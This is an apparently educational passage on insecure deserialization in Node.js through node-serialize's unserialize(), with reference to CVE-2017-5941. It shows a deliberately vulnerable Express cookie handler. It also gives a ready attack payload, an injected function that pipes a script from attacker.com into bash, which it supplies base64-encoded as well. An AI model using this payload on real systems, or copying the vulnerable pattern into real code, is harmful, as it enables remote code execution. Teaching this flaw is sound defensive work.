Using `node-serialize`'s `unserialize()` on untrusted data is extremely dangerous and leads to Remote Code Execution (RCE). This vulnerability was exploited extensively after CVE-2017-5941, and similar patterns remain common in Node.js applications today.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

app.get('/dashboard', (req, res) => {
  // DANGEROUS: Deserializing untrusted cookie data
  const sessionCookie = req.cookies.session;

  if (sessionCookie) {
    // This directly executes any code embedded in the serialized data
    const sessionData = serialize.unserialize(
      Buffer.from(sessionCookie, 'base64').toString()
    );

    res.json({
      welcome: `Hello, ${sessionData.username}`,
      role: sessionData.role
    });
  } else {
    res.status(401).json({ error: 'Not authenticated' });
  }
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE that spawns reverse shell
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash')}()"}

// Base64 encoded for cookie:
// eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIGh0dHBzOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgYmFzaCcpfSgpIn0=
